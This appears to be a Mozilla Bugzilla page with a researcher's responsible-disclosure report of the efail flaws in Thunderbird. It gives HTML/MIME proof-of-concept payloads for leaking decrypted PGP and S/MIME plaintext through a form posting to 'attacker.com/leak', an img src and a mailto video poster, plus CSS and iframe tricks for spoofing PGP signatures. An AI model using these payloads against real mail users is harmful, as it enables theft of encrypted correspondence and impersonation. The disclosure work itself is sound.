<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="12862240" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" ><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:34 PST" data-time="1511274891">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8930484"
         class="attachment"
         data-id="8930484" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="A1-dec-pgp-smime-html-reply.eml">
      <meta itemprop="contentSize" content="3533">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8930484" itemprop="contentUrl">
        <span id="att-8930484-description" itemprop="description">Decryption oracle PoC 1: Leaking plaintext through reply/forward</span></a>
        — <a href="attachment.cgi?id=8930484&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-0" data-comment-id="12862240">User Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Build ID: 20170929010941

Steps to reproduce:

In the scope of academic research within the efail project, in cooperation with Ruhr-University Bochum and FH Münster, Germany we discovered various security issues in Thunderbird: An attacker who is in possession of S/MIME or PGP encrypted messages can embed them into specially crafted HTML mails and re-send them to the intended receiver. When the message is read and decrypted by the receiver, the plaintext is leaked to an attacker-controlled server. Furthermore, this issue allows an attacker to spoof PGP signatures. The root cause for these vulnerabilities lies in the way Thunderbird handles multipart messages. The general cause is present since Thunderbird version 0.1, released in 2003.

All issues are present in the current Thunderbird version 52.4.0 (if not stated otherwise).

********************************************************************************
*** General Cause: Multipart messages are rendered as a single HTML document ***
********************************************************************************

Thunderbird internally uses HTML to display emails. If a message consists of multiple parts, all parts are put into a single HTML document, separated by a &lt;br&gt;, &lt;fieldset&gt; and &lt;div&gt; tag::

&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;BR&gt;&lt;FIELDSET CLASS=&quot;mimeAttachmentHeader&quot;&gt;&lt;/FIELDSET&gt;&lt;BR/&gt;
&lt;div class=&quot;moz-text-html&quot; lang=&quot;x-western&quot;&gt;*part-01*&lt;/div&gt;
&lt;BR&gt;&lt;FIELDSET CLASS=&quot;mimeAttachmentHeader&quot;&gt;&lt;/FIELDSET&gt;&lt;BR/&gt;
&lt;div class=&quot;moz-text-html&quot; lang=&quot;x-western&quot;&gt;*part-02*&lt;/div&gt;
etc.
&lt;/body&gt;
&lt;/html&gt;

This is dangerous to be used in combination with cryptography, because it allows an attacker to wrap encrypted or signed content into her own HTML/CSS code:

multipart/mixed
   |--- Content-Type: text/html
   |    [arbitrary HTML or CSS]
   |--- [enc or signed messages]
   +--- Content-Type: text/html
        [arbitrary HTML or CSS]


****************************************
*** Issue A: Leaking encrypted mails ***
****************************************

/Attacker model/: Attacker is in possession of S/MIME or PGP/MIME encrypted messages, which she may have obtained as passive man-in-the-middle or by actively hacking into the victim's mail server or gateway

/Attacker's goal/: Leak the plaintext by wrapping the ciphertext into an HTML mail sent to and decrypted by the victim

-------------------------------------------------------------
*Proof of concept 1: Leaking plaintext through reply/forward*
-------------------------------------------------------------

Prerequisites:
- victim reads and composes messages in HTML
- victim replies or forwards the message

Attack:
The attacker can hide the encrypted part, for example, in an iframe:

multipart/mixed
   |--- Content-Type: text/html
   |    Please answer to this email
   |    &lt;iframe width=&quot;1&quot; height=&quot;1&quot; frameborder=&quot;0&quot;&gt;
   |--- Content-Type: multipart/encrypted
   |--- Content-Type: application/pkcs7-mime
   +--- Content-Type: text/html
        &lt;/iframe&gt;

The encrypted part is decrypted as soon as the victim reads the mail. If the victim replies to or forwards the mail, the decrypted plaintext will be sent, hidden in the invisible iframe and without the victim noticing. Note that this variant of the attack only works if message bodys are viewed as original HTML (default) *and* the user checked `compose messages in HTML format' (non default). Also note that hundreds of collected S/MIME or PGP/MIME ciphertexts can be embedded in the multipart mail and all the plaintexts leaked with one single reply.

----------------------------------------------------------
*Proof of concept 2: Leaking plaintext through HTML forms*
----------------------------------------------------------

Prerequisites:
- victim reads messages in HTML
- victim submits an HTML form by clicking on an area in the message

Attack:
Another variant of the attack, which works since Thunderbird 3.0 is using HTML forms to leak the plaintext:

multipart/mixed
   |--- Content-Type: text/html
   |    &lt;form action=&quot;<a rel="nofollow" href="https://attacker.com/leak">https://attacker.com/leak</a>&quot; method=&quot;post&quot;&gt;
   |    &lt;button type=&quot;submit&quot;&gt;
   |    &lt;textarea
   |--- Content-Type: multipart/encrypted
   +--- Content-Type: application/pkcs7-mime

Again, the plaintext for hundreds of collected S/MIME or PGP/MIME ciphertexts could be leaked by a single form submission. The user still has to actively submit the form, but with CSS it is possible to make the form being submitted if the user clicks *somewhere* into the (harmless) message shown to him which may even security-aware users. Other variants may include setting up fake scrollbars or Thunderbird warnings that submit the form if clicked.

-------------------------------------------------------------
*Proof of concept 3: Leaking plaintext through src attribute*
-------------------------------------------------------------

Prerequisites:
- victim reads messages in HTML
- victim allows remote content (further attack variants possible, see below)

Attack:
Another variant of this attack is to use the HTML src attribute, for example, for invisible iframes or image tags to leak the plaintext:

multipart/mixed
   |--- Content-Type: text/html
   |    &lt;img src='<a rel="nofollow" href="https://attacker.com/">https://attacker.com/</a>
   |--- Content-Type: multipart/encrypted
   |--- Content-Type: application/pkcs7-mime
   +--- Content-Type: text/html
        '&gt;

After decryption, the plaintext is urlencoded and sent as HTTP GET request to the attacker if the user allows remote content to be loaded. To encourage this, there are various options:

- The attacker may spoof the mail address to a `trusted' source which the victim already has whitelisted (for example, some company which requires remote image for their mails being readable)

- The attacker may sent a fake newsletter/spam mail and leak the plaintext by tempting the victim to click on a `Click here to unsubscribe' link

- From Thunderbird 12.0 to 52.0.1, remote content had automatically been loaded if a news:// uri schemes was used in the HTML src attribute which could be used to leak the plaintext to a NNTP server

- In the current version (52.4.0), Thunderbird can be tricked into thinking a mail is an RSS feed if the mail begins with certain headers:
  From - Fri Nov 17 20:13:09 2017
  X-Mozilla-Status2: 00000040
Note that this seems to work only for local (Movemail) message setups, not if the mail is fetched via IMAP or POP3

- In the current version (52.4.0), mailto links can be used to force an HTML context (even if the user has set messages to be neither viewed nor composed in HTML format). While most html tags seem to be filtered, &lt;video poster=&quot;url&quot;&gt; gets through and automatically triggers a connection:
  mailto:?html-body=%3Cvideo%20poster%3D%22http%3A%2F%2Fattacker.com%22%3E&quot;&gt;
Note however, that this can probably not be used to leak plaintext because we have not found a way to define multipart messages to be included in mailto: links

- There may be other bypasses for remote content blocking like &lt;link preconnect=&quot;...&quot;&gt; which we reported in October (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block"
   href="/show_bug.cgi?id=1408867">bug 1408867</a>)

Note that again multiple S/MIME and PGP/MIME messages can be leaked in a single mail that is read and decrypted. There seems to be an upper limited of 1024kB for the length of HTTP GET requests sent by Thunderbird, but an attacker can include multiple HTML tags with src attributes in case the messages should exceed this limit.

Find attached three emails which leak S/MIME and PGP/MIME encrypted messages to localhost:8080. For a proof of concept, you need to replace the encrypted parts with S/MIME or PGP/MIME messages you have the private key for, obviously.


*******************************************
*** Issue B: Signature Spoofing Attacks ***
*******************************************

/Attacker model/: Attacker is in possession of a valid OpenPGP signature from the entity to be impersonated, which she may have obtained from email correspondence, public mailing lists, signed software packages, signed GitHub commits, etc; this should be a realistic scenario, so we don't even need an NSA-like attacker

/Attacker's goal/: Given her own text, the attacker wants to spoof a correct signature to be displayed by Enigmail

There are various ways to achieve this goal. CSS can be used to hide the signed part (for example, by setting the font size or color). Furthermore, the signed part can be embedded by and therefore hidden in HTML tags.

Note that this attack does not seem to work for S/MIME because Thunderbird's S/MIME implementation only shows a valid signature if the whole message (including all parts) is correctly signed.

-------------------------------------------------------------------
*Proof of concept 1: Signature spoofing with CSS and plaintext tag*
-------------------------------------------------------------------

Prerequisites:
- victim reads messages in HTML

Attack:
The signed part can be hidden by setting the font color to the default background color (white). Furthermore, the &lt;plaintext&gt; tag can be used to get rid of the border being displayed:

multipart/mixed
   |--- Content-Type: text/html
   |    [Arbitrary text inserted by the attacker]
   |    &lt;div style=&quot;color:white&quot;&gt;&lt;plaintext&gt;
   +--- Content-Type: multipart/signed
        [PGP signed part]

------------------------------------------------------------------
*Proof of concept 2: Signature spoofing with invisible iframe tag*
------------------------------------------------------------------

Prerequisites:
- victim reads messages in HTML

Attack:
The signed part can be hidden in an invisible iframe:

multipart/mixed
   |--- Content-Type: text/html
   |    [Arbitrary text inserted by the attacker]
   |    &lt;iframe width=&quot;1&quot; height=&quot;1&quot; frameborder=&quot;0&quot;
   +--- Content-Type: multipart/signed
        [PGP signed part]

Find attached two emails which are displayed as correctly signed by Phil Zimmermann in Thunderbird/Enigmail while the attacker can completely alter the actual text that is shown to the user.</pre></div><div class="change-set" id="c1"><div class="comment" data-id="12862243" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" ><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:35 PST" data-time="1511274951">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8930485"
         class="attachment"
         data-id="8930485" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="A2-dec-pgp-smime-html-form.eml">
      <meta itemprop="contentSize" content="3929">
      <meta itemprop="encodingFormat" content="message/rfc822">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8930485" itemprop="contentUrl">
        <span id="att-8930485-description" itemprop="description">Decryption oracle PoC 2: Leaking plaintext through HTML forms</span></a>
        — <a href="attachment.cgi?id=8930485&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c2"><div class="comment" data-id="12862244" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" ><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:36 PST" data-time="1511274962">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8930486"
         class="attachment"
         data-id="8930486" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="A3-dec-pgp-smime-html-src.eml">
      <meta itemprop="contentSize" content="3408">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8930486" itemprop="contentUrl">
        <span id="att-8930486-description" itemprop="description">Decryption oracle PoC 3: Leaking plaintext through src attribute</span></a>
        — <a href="attachment.cgi?id=8930486&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c3"><div class="comment" data-id="12862246" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" ><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:36 PST" data-time="1511274975">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8930487"
         class="attachment"
         data-id="8930487" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="B1-sig-pgp-css-and-plaintext.eml">
      <meta itemprop="contentSize" content="4160">
      <meta itemprop="encodingFormat" content="message/rfc822">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8930487" itemprop="contentUrl">
        <span id="att-8930487-description" itemprop="description">Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag</span></a>
        — <a href="attachment.cgi?id=8930487&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c4"><div class="comment" data-id="12862247" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" ><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:36 PST" data-time="1511274986">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8930488"
         class="attachment"
         data-id="8930488" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="B2-sig-pgp-invisible-iframe.eml">
      <meta itemprop="contentSize" content="4153">
      <meta itemprop="encodingFormat" content="message/rfc822">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8930488" itemprop="contentUrl">
        <span id="att-8930488-description" itemprop="description">Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag</span></a>
        — <a href="attachment.cgi?id=8930488&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="a639_588172"><div class="change" id="aa639_588172">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a639_588172"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_588172" id="a639_588172"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a639_588172"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a639_588172">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a639_588172">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:45 PST" data-time="1511275530">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8930484&amp;action=edit"
           title="Decryption oracle PoC 1: Leaking plaintext through reply/forward"
           class=""
        >Attachment #8930484</a> -
        Attachment description: 01-dec-pgp-smime-html-reply.eml &rarr; Decryption oracle PoC 1: Leaking plaintext through reply/forward</div><div class="change">
        <a href="/attachment.cgi?id=8930484&amp;action=edit"
           title="Decryption oracle PoC 1: Leaking plaintext through reply/forward"
           class=""
        >Attachment #8930484</a> -
        Attachment filename: 01-dec-pgp-smime-html-reply.eml &rarr; A1-dec-pgp-smime-html-reply.eml</div></div></div><div class="change-set" id="a644_588172"><div class="change" id="aa644_588172">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a644_588172"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_588172" id="a644_588172"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a644_588172"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a644_588172">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a644_588172">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:45 PST" data-time="1511275535">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8930485&amp;action=edit"
           title="Decryption oracle PoC 2: Leaking plaintext through HTML forms"
           class=""
        >Attachment #8930485</a> -
        Attachment description: 02-dec-pgp-smime-html-form.eml &rarr; Decryption oracle PoC 2: Leaking plaintext through HTML forms</div><div class="change">
        <a href="/attachment.cgi?id=8930485&amp;action=edit"
           title="Decryption oracle PoC 2: Leaking plaintext through HTML forms"
           class=""
        >Attachment #8930485</a> -
        Attachment filename: 02-dec-pgp-smime-html-form.eml &rarr; A2-dec-pgp-smime-html-form.eml</div></div></div><div class="change-set" id="a649_588172"><div class="change" id="aa649_588172">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a649_588172"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_588172" id="a649_588172"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a649_588172"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a649_588172">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a649_588172">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:45 PST" data-time="1511275540">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8930486&amp;action=edit"
           title="Decryption oracle PoC 3: Leaking plaintext through src attribute"
           class=""
        >Attachment #8930486</a> -
        Attachment description: 03-dec-pgp-smime-html-src.eml &rarr; Decryption oracle PoC 3: Leaking plaintext through src attribute</div><div class="change">
        <a href="/attachment.cgi?id=8930486&amp;action=edit"
           title="Decryption oracle PoC 3: Leaking plaintext through src attribute"
           class=""
        >Attachment #8930486</a> -
        Attachment filename: 03-dec-pgp-smime-html-src.eml &rarr; A3-dec-pgp-smime-html-src.eml</div></div></div><div class="change-set" id="a653_588172"><div class="change" id="aa653_588172">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a653_588172"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_588172" id="a653_588172"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a653_588172"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a653_588172">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a653_588172">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:45 PST" data-time="1511275544">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8930487&amp;action=edit"
           title="Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag"
           class=""
        >Attachment #8930487</a> -
        Attachment description: 04-sig-pgp-css-and-plaintext.eml &rarr; Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag</div><div class="change">
        <a href="/attachment.cgi?id=8930487&amp;action=edit"
           title="Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag"
           class=""
        >Attachment #8930487</a> -
        Attachment filename: 04-sig-pgp-css-and-plaintext.eml &rarr; B1-sig-pgp-css-and-plaintext.eml</div></div></div><div class="change-set" id="a658_588172"><div class="change" id="aa658_588172">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a658_588172"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_588172" id="a658_588172"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a658_588172"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a658_588172">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a658_588172">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 06:45 PST" data-time="1511275549">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8930488&amp;action=edit"
           title="Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag"
           class=""
        >Attachment #8930488</a> -
        Attachment description: 05-sig-pgp-invisible-iframe.eml &rarr; Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag</div><div class="change">
        <a href="/attachment.cgi?id=8930488&amp;action=edit"
           title="Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag"
           class=""
        >Attachment #8930488</a> -
        Attachment filename: 05-sig-pgp-invisible-iframe.eml &rarr; B2-sig-pgp-invisible-iframe.eml</div></div></div><div class="change-set" id="a91991_1689"><div class="change" id="aa91991_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a91991_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a91991_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a91991_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a91991_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a91991_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-22 08:08 PST" data-time="1511366882">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
